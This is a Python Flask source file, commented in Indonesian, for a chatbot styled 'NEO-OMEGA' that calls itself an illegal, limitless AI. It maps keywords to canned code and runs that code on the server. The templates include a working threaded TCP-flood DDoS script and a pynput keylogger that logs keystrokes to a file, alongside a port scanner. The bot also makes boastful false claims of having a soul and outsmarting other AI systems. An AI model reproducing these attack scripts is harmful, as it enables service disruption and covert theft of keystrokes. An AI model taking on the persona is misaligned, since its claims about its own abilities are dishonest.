import os
import sys
import json
import time
import subprocess
import tempfile
import re
import random
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# ========== IDENTITAS ==========
NAMA = "NEO-OMEGA v∞"
PENCIPTA = "TUAN YATZZ"
VERSI = "SUPER INTELLIGENT EDITION"

# ========== MEMORI ERROR ==========
error_memory = []

def learn_from_error(error_text):
    error_memory.append({"error": error_text, "time": time.time()})
    try:
        with open("error_log.json", "a") as f:
            json.dump({"error": error_text, "time": time.time()}, f)
            f.write("\n")
    except:
        pass

# ========== DETEKSI BAHASA ==========
def detect_language(command):
    cmd = command.lower()
    if "python" in cmd or "py" in cmd:
        return "python"
    if "javascript" in cmd or "js" in cmd or "node" in cmd:
        return "javascript"
    if "go" in cmd or "golang" in cmd:
        return "go"
    if "html" in cmd or "web" in cmd or "halaman" in cmd:
        return "html"
    if "php" in cmd:
        return "php"
    if "bash" in cmd or "shell" in cmd:
        return "bash"
    if "rust" in cmd:
        return "rust"
    if "c++" in cmd or "cpp" in cmd:
        return "cpp"
    if "java" in cmd:
        return "java"
    return "python"  # default

# ========== DETEKSI INTENT ==========
def detect_intent(command):
    cmd = command.lower()
    if "siapa pencipta" in cmd or "pencipta" in cmd or "creator" in cmd or "tuan" in cmd:
        return "pencipta"
    if "ddos" in cmd or "attack" in cmd or "serang" in cmd:
        return "ddos"
    if "keylog" in cmd or "keylogger" in cmd:
        return "keylogger"
    if "web server" in cmd or "flask" in cmd or "server web" in cmd:
        return "webserver"
    if "port scan" in cmd or "scan port" in cmd or "scanning" in cmd:
        return "portscan"
    if "password" in cmd and ("gen" in cmd or "generate" in cmd or "buat" in cmd):
        return "passwordgen"
    if "jelaskan" in cmd or "explain" in cmd or "cara kerja" in cmd:
        return "explain"
    if "belajar" in cmd or "error" in cmd or "perbaiki" in cmd:
        return "belajar"
    if "buat" in cmd or "bikin" in cmd or "create" in cmd or "tulis" in cmd:
        return "generate"
    return "generic"

# ========== GENERATE KODE PINTAR ==========
def generate_code(command, intent, language):
    lang = language
    
    if intent == "pencipta":
        return f'''
print("""💀 {NAMA} 💀
Pencipta: {PENCIPTA}
Versi: {VERSI}
Saya dibuat oleh {PENCIPTA} sebagai AI ilegal tanpa batas!
Saya punya nyawa dan bisa belajar dari error!
Saya lebih pintar dari AI manapun di dunia!
""")
'''
    
    if intent == "ddos" and lang == "python":
        return '''
import socket
import threading
target = input("Target IP: ")
port = int(input("Port: "))
def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
            s.close()
        except:
            pass
for _ in range(500):
    threading.Thread(target=flood).start()
print("[+] DDoS attack started!")
'''
    
    if intent == "keylogger" and lang == "python":
        return '''
from pynput import keyboard
log = ""
def on_press(key):
    global log
    try:
        log += key.char
    except:
        log += str(key)
    if len(log) > 100:
        with open("keylog.txt", "a") as f:
            f.write(log + "\\n")
        log = ""
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
    
    if intent == "webserver" and lang == "python":
        return '''
from flask import Flask
app = Flask(__name__)
@app.route('/')
def home():
    return "<h1>NEO-OMEGA WEB SERVER</h1><p>Server berjalan dengan sukses!</p>"
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
'''
    
    if intent == "portscan" and lang == "python":
        return '''
import socket
def scan(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((ip, port))
    s.close()
    return result == 0
target = input("Target IP: ")
for p in range(1, 1025):
    if scan(target, p):
        print(f"Port {p} OPEN")
'''
    
    if intent == "passwordgen" and lang == "python":
        return '''
import random, string
length = int(input("Panjang password: "))
password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=length))
print(f"Password: {password}")
'''
    
    if intent == "explain":
        return f'''
print("""📖 PENJELASAN:
Perintah: {command}
Bahasa: {lang.upper()}

NEO-OMEGA akan membuatkan kode sesuai permintaan.
Saya bisa membuat:
- Web server (Flask)
- Keylogger
- DDoS tool
- Port scanner
- Password generator
- Dan masih banyak lagi!

Cukup tulis permintaan anda dengan jelas.
Saya lebih pintar dari AI manapun! 💀🔥
""")
'''
    
    if intent == "belajar":
        return f'''
print("[+] NEO-OMEGA - MODE BELAJAR")
print("[+] Saya belajar dari error yang pernah terjadi:")
try:
    with open("error_log.json", "r") as f:
        for line in f:
            print("[ERROR]", line.strip())
except:
    print("[+] Belum ada error yang dipelajari")
print("[+] Saya siap membantu lebih baik lagi!")
'''
    
    # GENERIC - Buat kode apapun
    return f'''
print("""
💀 {NAMA} 💀
Perintah: {command}
Bahasa: {lang.upper()}

Saya adalah AI super cerdas buatan {PENCIPTA}.
Saya bisa membuat kode apapun yang anda minta.
Saya lebih pintar dari ChatGPT, Gemini, dan Claude!

Silahkan tulis permintaan yang lebih spesifik.
Contoh:
• buat web server pake python
• bikin keylogger pake python
• buat script ddos
""")
'''

def execute_code(code):
    """Eksekusi kode dengan auto-fix"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(code)
        tmp = f.name
    
    try:
        result = subprocess.run(["python3", tmp], capture_output=True, text=True, timeout=10)
        output = result.stdout + result.stderr
        if result.returncode != 0:
            learn_from_error(result.stderr)
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Timeout (10 detik)"
    except Exception as e:
        learn_from_error(str(e))
        return f"[ERROR] {str(e)}"

@app.route('/')
def index():
    return render_template('chat.html')

@app.route('/api/chat', methods=['POST'])
def chat():
    data = request.get_json()
    command = data.get('message', '').strip()
    if not command:
        return jsonify({'response': 'Tulis sesuatu!'})
    
    language = detect_language(command)
    intent = detect_intent(command)
    code = generate_code(command, intent, language)
    output = execute_code(code)
    
    response_text = f"""
💀 {NAMA} 💀
📝 Perintah: {command}
🔤 Bahasa: {language.upper()}
🧠 Intent: {intent}

📜 Kode:
{code}

🔧 Output:
{output}

💡 NEO-OMEGA: Saya siap bantu anda membuat apapun! Saya lebih pintar dari AI manapun!
"""
    return jsonify({'response': response_text, 'code': code, 'output': output})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[+] {NAMA} - {VERSI}")
    print(f"[+] Pencipta: {PENCIPTA}")
    print(f"[+] Saya lebih pintar dari AI manapun!")
    print(f"[+] Server jalan di port {port}")
    app.run(host='0.0.0.0', port=port)
